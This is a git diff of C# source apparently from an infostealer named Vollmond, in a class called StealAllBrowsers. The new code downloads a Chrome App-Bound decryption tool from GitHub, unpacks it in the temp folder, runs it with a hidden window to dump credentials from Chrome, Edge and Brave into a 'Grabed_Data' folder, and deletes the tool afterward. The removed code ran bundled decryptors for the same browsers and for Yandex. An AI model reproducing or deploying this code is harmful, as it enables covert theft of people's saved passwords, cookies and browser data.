@@ -1,78 +1,69 @@
-﻿using System.Diagnostics;
+﻿/*
+ ----------------------------------------
+Here is using Chrome-App-Bound Decryption tool.
+ ----------------------------------------
+original repository:  https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption - This repository with MIT License !!!
+ ----------------------------------------
+ */
+
+using System.Diagnostics;
+using System.IO.Compression;
 using System.Text;
 
 namespace Vollmond.Browsers
 {
     internal class StealAllBrowsers
     {
-        /*
-        ----------------------------------------------------------
-         Author chromelevator_x64.exe: https://github.com/xaitax
-        Original repo, with source code: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
-        ----------------------------------------------------------
-        Author YandexDecryptor.exe: https://github.com/LimerBoy
-        Original repo, with source code: https://github.com/LimerBoy/Soviet-Thief/tree/main/csharp
-        ----------------------------------------------------------
-         */
-        public static void stealAllBrowsers()
+        public static async void Steal()
         {
-            string temp_path = Path.GetTempPath();
-            string dataFolder_path = Path.Combine(temp_path, "Grabed_Data", "BrowsersData");
-
-            Directory.CreateDirectory(Path.Combine(temp_path, "Grabed_Data", "BrowsersData")); // Create directory for data
-
-            // Chrome, Edge and Brave
             try
             {
-                ExtractResources.ExtractResource("payload.Browsers", "chromelevator_x64.exe", temp_path);
-
-                ProcessStartInfo startInfo = new ProcessStartInfo
+                var temp = Path.GetTempPath();
+                
+                if (File.Exists(temp + "\\chromelevator_x64.zip") || File.Exists(temp + "\\chromelevator_x64.exe"))
                 {
-                    FileName = Path.Combine(temp_path, "chromelevator_x64.exe"),
-                    Arguments = $"-v -f -o {$@"C:/Users/{Environment.UserName}/AppData/Local/Temp/Grabed_Data/BrowsersData"} all",
-                    RedirectStandardOutput = true, // Allow interception
-                    UseShellExecute = false,       // I don't know what is it.. But i know what, it isn't important
-                    CreateNoWindow = true,          // Hide Console Window
-                    StandardOutputEncoding = System.Text.Encoding.UTF8
-                };
-
-                using (Process process = Process.Start(startInfo))
+                    File.Delete(temp + "\\chromelevator_x64.zip");
+                    File.Delete(temp + "\\chromelevator_x64.exe");
+                }
+                using (var client = new HttpClient())
                 {
-                    string result = process.StandardOutput.ReadToEnd();
-                    process.WaitForExit();
+                    var link = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip";
+                    await using var stream = await client.GetStreamAsync(link);
+                    await using var file = File.Create(temp + "\\chromelevator_x64.zip");
+                    await stream.CopyToAsync(file);
+                }
 
-                    File.WriteAllText(Path.Combine(temp_path, "Grabed_Data", "BrowsersData", "Info.txt"), result, Encoding.UTF8);
+                ZipFile.ExtractToDirectory(temp + "\\chromelevator_x64.zip", temp);
+
+                // Unnecessary files
+                File.Delete(temp + "\\chromelevator_arm64.exe");
+                File.Delete(temp + "\\encryptor.exe");
+
+                using (Process process = new())
+                {
+                    process.StartInfo.FileName = temp + "\\chromelevator_x64.exe";
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.Arguments = $"-v -f -o \"C:/Users/{Environment.UserName}/AppData//Local/Temp/Grabed_Data/BrowersData\" all"; // -v - --verbose, -f - --fingerprint, -o - --outup-path <path>, all - All browsers (chrome, edge and brave)
+
+                    process.Start();
+
+                    using (StreamReader reader = process.StandardOutput)
+                        File.WriteAllText(Path.Combine(temp, "Grabed_Data", "BrowsersData", "info.txt"), reader.ReadToEnd());
                 }
             }
             catch { }
-
-            // Yandex browser
-            try
+            finally
             {
-                ExtractResources.ExtractResource("payload.Browsers", "YandexDecryptor.exe", temp_path);
-
-                ProcessStartInfo yandex_info = new ProcessStartInfo()
+                try
                 {
-                    FileName = Path.Combine(temp_path, "YandexDecryptor.exe"),
-                    RedirectStandardOutput = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
-
-                using (Process process = Process.Start(yandex_info))
-                {
-                    string result = process.StandardOutput.ReadToEnd();
-                    process.WaitForExit();
-
-                    Directory.CreateDirectory(Path.Combine(dataFolder_path, "Yandex"));
-
-                    if (!String.IsNullOrEmpty(result))
-                        File.WriteAllText(Path.Combine(dataFolder_path, "Yandex", "Extracted_data.txt"), result, Encoding.UTF8);
-                    else
-                        File.WriteAllText(Path.Combine(dataFolder_path, "Yandex", "Extracted_data.txt"), "Yandex does not exist or was not found");
+                    File.Delete(Path.Combine(Path.GetTempPath(), "chromelevator_x64.zip"));
+                    File.Delete(Path.Combine(Path.GetTempPath(), "chromelevator_x64.exe"));
                 }
+                catch { }
             }
-            catch { }
+            }
         }
     }
-}
